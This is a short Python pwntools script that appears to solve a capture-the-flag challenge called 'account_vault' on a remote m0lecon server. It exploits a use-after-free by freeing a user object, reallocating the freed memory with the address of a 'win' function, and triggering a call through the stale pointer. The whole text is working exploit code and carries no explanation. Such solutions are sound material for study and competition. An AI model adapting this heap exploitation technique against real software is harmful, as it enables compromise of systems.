#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./account_vault', checksec=False)
p = remote('offsec.m0lecon.it', 13504)
win = elf.sym.win
p.sendlineafter(b'> ', b'1') # Allocate User
p.sendlineafter(b'> ', b'2') # Free User
p.sendlineafter(b'> ', b'3') # Allocate Data
p.sendafter(b'data: ', p64(win).ljust(32, b'X'))
p.sendlineafter(b'> ', b'4') # Execute Action
print(p.recvall(timeout=1).decode(errors='replace'))
